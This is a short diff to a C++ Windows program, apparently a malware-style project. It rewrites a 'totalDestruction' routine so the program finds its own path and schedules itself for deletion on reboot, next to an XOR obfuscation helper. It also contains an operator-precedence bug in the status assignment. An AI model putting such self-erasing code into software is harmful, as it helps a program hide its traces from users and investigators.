@@ -102,19 +102,32 @@ string XOREncryption(string data) //Do not use strlen on XOREncryption
 
 }//Source: https://www.cprogramming.com/tutorial/xor.html
 
-int totalDestruction(string path_prog) //MOD_DESTRUCTION:
+int totalDestruction() //MOD_DESTRUCTION:
 {
-    wstring path_prog_unicode(path_prog.begin(), path_prog.end());
-    wcout << "PATH PROG: " << path_prog_unicode << endl;
+    //deletes the program on reboot. 
 
-    if(DeleteFileW(path_prog_unicode.c_str()) == 0)    
+    WCHAR path[MAX_PATH];
+    DWORD status;
+    if(status = GetModuleFileNameW(NULL,path,MAX_PATH) == 0)
     {
-        //if error
+        //error
         return 1;
+    }
+
+    cout << "STATUS TOTAL DESC: " << status << endl;
+    wcout << "path prog: " << path << endl;
+    BOOL test = MoveFileExW(path,NULL,MOVEFILE_DELAY_UNTIL_REBOOT);
+    cout << "Tes: " << test << endl;
+    if(test != 0)
+    {
+        cout << "Operation delete prog ok" << endl;
+        return 0;
     }
     else
     {
-        return 0;
+        // error
+        cout << "klast err-->" << GetLastError() << endl;
+        return 1;
     }
-    
+
 }
